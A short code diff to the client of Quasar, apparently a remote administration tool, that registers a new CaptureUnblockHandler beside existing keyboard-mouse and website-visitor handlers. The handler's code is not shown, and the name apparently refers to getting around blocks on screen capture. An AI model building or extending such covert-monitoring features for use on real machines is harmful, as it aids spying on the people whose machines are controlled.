@@ -253,6 +253,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new TcpConnectionsHandler());
             _messageProcessors.Add(new WebsiteVisitorHandler());
             _messageProcessors.Add(new KBMDriverHandler());
+            _messageProcessors.Add(new CaptureUnblockHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
